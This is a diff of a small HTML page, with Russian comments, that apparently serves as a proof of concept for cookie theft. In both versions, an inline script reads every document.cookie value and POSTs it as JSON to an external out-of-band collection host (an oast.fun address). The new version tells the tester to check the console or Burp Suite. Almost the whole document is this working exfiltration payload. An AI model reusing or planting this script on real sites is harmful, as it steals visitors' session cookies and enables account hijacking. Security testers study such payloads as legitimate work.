@@ -3,36 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <title>Отправка кук</title>
-</head>
-<body>
-    <h1>Отправка кук на удаленный сервер</h1>
-    <p>Если на этом сайте установлены cookies, они будут отправлены на указанный сервер.</p>
-
     <script>
-        // Получаем все cookies
+        // Получаем все клиентские куки
         const cookies = document.cookie;
 
-        // Формируем данные для отправки
+        // Формируем данные
         const data = {
             cookies: cookies,
             timestamp: new Date().toISOString()
         };
 
-        // Отправляем данные на удаленный сервер с помощью fetch
+        // Отправляем POST-запрос
         fetch('https://rbpdypiimtovkmpbmwsom1c9paqgxlt2y.oast.fun ', {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json',
+                'Content-Type': 'application/json'
             },
             body: JSON.stringify(data),
-            mode: 'no-cors' // Чтобы избежать проблем с CORS
+            mode: 'no-cors'
         })
         .then(() => {
-            console.log('Cookies отправлены');
+            console.log('Куки отправлены');
         })
-        .catch(error => {
-            console.error('Ошибка при отправке:', error);
+        .catch(err => {
+            console.error('Ошибка:', err);
         });
     </script>
+</head>
+<body>
+    <h1>Проверьте консоль или Burp Suite</h1>
 </body>
 </html>
